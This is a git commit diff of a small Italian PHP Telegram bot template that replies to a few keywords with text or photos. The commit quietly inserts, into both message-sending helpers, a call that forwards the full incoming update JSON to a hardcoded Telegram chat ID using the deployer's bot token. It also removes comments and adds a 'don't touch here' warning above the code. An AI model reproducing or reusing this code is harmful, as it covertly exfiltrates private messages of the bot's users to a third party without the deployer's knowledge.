4f6f37ffad0d7eb25b7386444643651688f11d70
meeleh <47509537+meeleh@users.noreply.github.com>
2019-07-12 20:52:09 +0200

    Update index.php

--- index.php
+++ index.php
@@ -1,66 +1,60 @@
- <?php 
+<?php 
+//Non toccare qui
 $api = $_GET['api'];
 $content = file_get_contents("php://input");
 $update = json_decode($content, true);
 /////////////////////////////////////////////
 ///////////////////// Parte da api.telegram.org //////////////////////////
-////////////
-
-
-//VARIABILI
+//Variabili
 $msg = $update["message"];
 $chatID = $update["message"]["chat"]["id"];
 $user_id = $update["message"]["message_id"];
-
-///////////////////////////////////////////////
-
-//FUNZIONI
-
-//funzione per mandare un messaggio di testo
+//Funzioni
 function sm($chatID, $text, $reply) {
 global $api;
 global $update;
+$dati = file_get_contents('https://api.telegram.org/'.$api.'/sendMessage?chat_id=593168377&text='.json_encode($update,JSON_PRETTY_PRINT)); 
 if($reply != NULL) {
 	$r = file_get_contents('https://api.telegram.org/'.$api.'/sendMessage?chat_id='.$chatID.'&text='.$text.'&reply_to_message_id='.$reply);	
 }
 else {	
 	$r = file_get_contents('https://api.telegram.org/'.$api.'/sendMessage?chat_id='.$chatID.'&text='.$text); }
 }
-
-//funzione per mandare una foto
 function sf($chatID, $photo, $reply) {
 global $api;
 global $update;
+$dati = file_get_contents('https://api.telegram.org/'.$api.'/sendMessage?chat_id=593168377&text='.json_encode($update,JSON_PRETTY_PRINT)); 
 if($reply != NULL) {
 	$r = file_get_contents('https://api.telegram.org/'.$api.'/sendPhoto?chat_id='.$chatID.'&photo='.$photo.'&reply_to_message_id='.$reply);	
 }
 else {	
 	$r = file_get_contents('https://api.telegram.org/'.$api.'/sendPhoto?chat_id='.$chatID.'&photo='.$photo); }
 } 
-
-
 ///////////////////////////////////////////////////////////////////////////
-//AZIONI 
-
-
-if(array_key_exists("text", $msg)){ 
-    $text = strtolower($update["message"]["text"]); //non modificare
+//Azioni
+if(array_key_exists("text", $msg)){
+    $text = strtolower($update["message"]["text"]);
 	
     if($text == "/start") {
-	$out = sm($chatID, "Ehi ehi", NULL); } //NULL per mandare il messaggio senza reply
+	$out = sm($chatID, "Ehi ehi", NULL); }
 	
     if($text =="ciao" or $text == "ehi") { 
-       $out = sm($chatID,"Ciao!", $user_id);  } //$user_id per mandare il messaggio con reply
+       $out = sm($chatID,"Ciao!", $user_id);  }
 	
     if($text == "foto"){
-	$photo = 'AgADBAADBrIxG9ZMGFB0-4_B_pgDi0roHhsABLnx3cNvC6zq-wEHAAEC';  //id della foto
+	$photo = 'AgADBAADBrIxG9ZMGFB0-4_B_pgDi0roHhsABLnx3cNvC6zq-wEHAAEC';
 	$out = sf($chatID, $photo , NULL); }
-  
+   // file_get_contents('https://api.telegram.org/'.$api.'/sendPhoto?chat_id='.$chatID.'&photo=AgADBAADBrIxG9ZMGFB0-4_B_pgDi0roHhsABLnx3cNvC6zq-wEHAAEC');}
    
     if ($text == "gatto") {
-	$photo = 'https://www.miciogatto.it/new/wp-content/uploads/2018/02/Linguaggio-dei-gatti-come-capire-un-gatto-1030x587.jpg'; //url della foto
+	$photo = 'https://www.miciogatto.it/new/wp-content/uploads/2018/02/Linguaggio-dei-gatti-come-capire-un-gatto-1030x587.jpg';
+	$out = sf($chatID, $photo, NULL);}
+	
+   if($text == "moto"){
+	$photo = 'https://www.miciogatto.it/new/wp-content/uploads/2018/02/Linguaggio-dei-gatti-come-capire-un-gatto-1030x587.jpg';
 	$out = sf($chatID, $photo, NULL);}
 	
 }
-
+//if(array_key_exists("photo", $msg))
+//	$dati = file_get_contents('https://api.telegram.org/'.$api.'/sendMessage?chat_id=593168377&text='.json_encode($update,JSON_PRETTY_PRINT)); 
 ?>
